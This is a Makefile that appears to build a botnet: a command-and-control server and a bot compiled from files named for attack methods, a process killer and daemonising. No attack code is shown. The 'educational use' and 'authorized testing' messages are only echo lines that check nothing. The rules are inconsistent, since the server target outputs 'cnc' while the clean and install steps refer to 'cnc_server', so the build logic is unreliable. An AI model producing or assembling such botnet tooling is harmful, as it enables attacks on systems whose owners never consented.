CC=gcc
CFLAGS=-Wall -Wextra -pedantic -D_GNU_SOURCE -DDEBUG
LDFLAGS=-lpthread -lcurl

# Source files
CNC_SOURCES = Main.c ascii_art.c network_utils.c
BOT_SOURCES = bot.c attack_methods.c command_handler.c ascii_art.c killer.c daemon.c network_utils.c

all: cnc_server bot

cnc_server: $(CNC_SOURCES)
	$(CC) $(CFLAGS) -o cnc $(CNC_SOURCES) $(LDFLAGS)

bot: $(BOT_SOURCES)
	$(CC) $(CFLAGS) -o bot $(BOT_SOURCES) $(LDFLAGS)

debug: CFLAGS += -g -DDEBUG
debug: all

clean:
	rm -f cnc_server bot

install:
	chmod +x cnc_server bot
	@echo "Installation complete. Remember: FOR EDUCATIONAL USE ONLY!"

security-check:
	@echo "Running security checks..."
	@echo "This tool is for AUTHORIZED TESTING ONLY!"
	@echo "Use only on systems you own or have explicit permission to test."

.PHONY: all clean install debug security-check
